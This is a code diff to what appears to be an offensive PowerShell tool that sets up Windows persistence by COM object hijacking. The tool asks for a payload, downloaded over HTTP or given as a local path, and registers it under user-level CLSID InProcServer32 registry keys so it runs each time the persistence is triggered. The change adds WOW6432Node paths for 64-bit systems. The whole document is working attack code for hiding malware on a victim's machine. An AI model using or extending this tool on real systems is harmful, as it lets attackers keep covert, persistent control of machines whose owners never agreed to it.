@@ -19,8 +19,8 @@ function Get-Code
 {	
 	do
 	{
-	    cls
-	    Write-Host "Insert the payload (dll for COM Object hijack, exe for Extension Handler method) that you want to be executed each time the persistence is triggered." 
+		cls
+		Write-Host "Insert the payload (dll for COM Object hijack, exe for Extension Handler method) that you want to be executed each time the persistence is triggered." 
 	    Write-Host "1: Download it via HTTP." 
 	    Write-Host "2: Insert local path."
 	    $mode = Read-Host "Choose one! I dont have all day, you know!?" 
@@ -44,8 +44,14 @@ function COM-Object
 	$guid = Read-Host "Insert GUID of the COM Object (e.g: 5A8C927F-C467-437D-9AC3-C874A100400F)."
 	$code = Get-Code
 	Write-Host "Alright, let's do some magic..."	
-	$Path1 = "HKCU:\Software\Classes\CLSID\{$guid}"
-	$Path2 = "HKCU:\Software\Classes\CLSID\{$guid}\InProcServer32"
+	$arch = Read-Host "Is the system x86-based? y/n"
+	if ($arch -eq "y"){
+		$Path1 = "HKCU:\Software\Classes\CLSID\{$guid}"
+		$Path2 = "HKCU:\Software\Classes\CLSID\{$guid}\InProcServer32"
+	}else{
+		$Path1 = "HKCU:\Software\Classes\WOW6432Node\CLSID\{$guid}"
+		$Path2 = "HKCU:\Software\Classes\WOW6432Node\CLSID\{$guid}\InProcServer32"
+	}
 	New-Item -Path $Path1 
 	New-Item -Path $Path2
 	Set-Item -Path $Path2 -Value $code
